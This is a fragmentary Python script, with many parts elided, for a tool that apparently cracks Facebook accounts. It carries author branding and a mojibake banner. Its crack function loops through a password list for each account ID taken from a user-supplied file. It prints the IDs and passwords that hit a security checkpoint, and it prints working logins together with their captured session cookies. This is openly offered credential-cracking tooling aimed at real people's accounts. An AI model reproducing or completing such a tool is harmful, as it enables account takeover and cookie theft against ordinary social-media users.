...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSUMON')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'SUMON' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  SUMON,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/SUMON.King.Ok.Bro')
def banner():
	os.system("clear")
	logo =("""''\33[m
...
\033[1;31mâ€ŠðŸŒ[ð˜½ð˜¼ð™‰ð™‚ð™¡ð˜¼ð˜¿ð™€ð™Žð™ƒ ð˜¾ð™”ð˜½ð™€ð™ ð™†ð™„ð™‰ð™‚ ð™Šð™ð™ {ð‘ðŸ¬ðŠðŸ­}]ðŸ˜Ž\033[1;37m
'\33[mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 Author    :SUMON
 Github    : SUMON-143-CYBER-KING
 Facebook  : SUMON HASAN SUMON 
...
`MMMMMMMb.   6MMMMb  `MM    d' `MM'      
 MM    `Mb  8P    Y8  MM   d'   MM       
 MM     MM 6M      Mb MM  d'    MM      \033[1;34mðâ€Š\033[1;37m  
 MM     MM MM      MM MM d'     MM      \033[1;31mâ€Šð‘\033[1;37m  
 MM    .M9 MM      MM MMd'      MM      \033[1;35mðŽâ€Š\033[1;37m 
 MMMMMMM9' MM      MM MMYM.     MM      \033[1;34mðŒâ€Š\033[1;37m 
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/sumon.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[SUMON-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}â€¢{P}[{h}Ok{P}â€¢{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#SUMON-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢SUMON-Cp] {idf} â€¢ {pw}')     
				...
				#SUMON-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}â€¢SUMON-OkðŸ’š] {idf} â€¢ {pw}\n\033[0;93m[ðŸŒº]= COOKIES â€¢ \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " SUMON,  Ok,  id"')
